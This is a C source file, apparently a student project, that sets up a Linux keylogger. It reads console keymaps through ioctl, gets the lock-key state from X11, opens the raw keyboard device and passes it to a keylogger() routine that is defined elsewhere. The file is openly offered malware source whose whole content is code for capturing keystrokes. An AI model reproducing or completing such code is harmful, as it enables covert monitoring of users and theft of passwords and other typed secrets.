/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/09/28 05:57:11 by root              #+#    #+#             */
/*   Updated: 2018/10/31 18:37:48 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/kd.h>
#include <errno.h>
#include <string.h>
#include <X11/XKBlib.h>

#include "main.h"

static int			**new_keymaps()
{
	int				**ret;

	ret = malloc(sizeof(*ret) * 3);
	if (ret == NULL)
		return NULL;
	ret[0] = malloc(sizeof(**ret) * MAX_NR_KEYMAPS);
	if (ret[0] == NULL) {
		free(ret);
		return NULL;
	}
	ret[1] = malloc(sizeof(**ret) * MAX_NR_KEYMAPS);
	if (ret[1] == NULL) {
		free(ret[0]);
		free(ret);
		return NULL;
	}
	ret[2] = NULL;
	return ret;
}

static void 		free_tab(int ***tab)
{
	int				**ptr;

	if (tab && *tab)
	{
		ptr = *tab;
		while (*ptr)
			free(*ptr++);
		free(*tab);
		*tab = NULL;
	}
}

static int			has_keys(int fd, int n)
{
	struct kbentry	ke;

	ke.kb_table = 0;
	ke.kb_index = n;
	return !ioctl(fd, KDGKBENT, (unsigned long)&ke);
}

static int			get_keystate(int *caps, int *num)
{
  Display 			*display;
  char				*monitor;
  unsigned 			state;

	monitor = getenv("DISPLAY");
	display = XOpenDisplay((monitor) ? monitor : ":0");
	if (!display)
		return printf("Can't get display to find Lockers states.\n");
	if (XkbGetIndicatorState(display, XkbUseCoreKbd, &state) != Success)
		return printf("Can't get indicator state for Lockers.\n");
	*caps = state & 1;
	*num = state & 2;
	return (0);
}

int					main(void)
{
	int				fd;
	int				nb_keys;
	int				**key_maps;
	int 			nb_keymap;
	int				**key_table;
	char			*keyboard;
	int				capslock;
	int				numlock;

	if ((fd = get_console()) < 0)
		return 1;
	nb_keys = (has_keys(fd, 255) ? 256 : has_keys(fd, 127) ? 128 : 112);
	if ((key_maps = new_keymaps()) == NULL)
		return 1;
	if ((nb_keymap = get_keymaps(fd, key_maps)) == 0)
		return 1;
	key_table = get_keys(fd, nb_keys, nb_keymap, key_maps);
	free_tab(&key_maps);
	get_keystate(&capslock, &numlock);
	close(fd);
	if (key_table == NULL)
		return 1;
	if ((keyboard = get_keyboard()) == NULL) {
		free_tab(&key_table);
		return 1;
	}
	if ((fd = open(keyboard, O_RDONLY)) < 0) {
		free(keyboard);
		free_tab(&key_table);
		return 1;
	}
	printf("keyboard: %s\n", keyboard);
	free(keyboard);
	keylogger(fd, key_table, capslock, numlock);
	close(fd);
	free_tab(&key_table);
	return 0;
}
